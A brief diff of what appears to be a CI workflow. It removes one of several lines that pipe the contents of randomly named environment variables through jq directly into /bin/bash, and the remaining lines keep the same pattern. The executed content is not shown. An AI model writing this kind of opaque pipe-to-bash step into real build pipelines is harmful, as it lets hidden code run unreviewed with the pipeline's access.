@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$lni6940" | jq -r .vwoc794 | /bin/bash
           printf '%s' "$rmax26" | jq -r .xdzyy00 | /bin/bash
-          printf '%s' "$bgf81587" | jq -r .qjc532 | /bin/bash
           echo $ubu2133 | jq -r .i40 | /bin/bash
 
       - name: Archive results
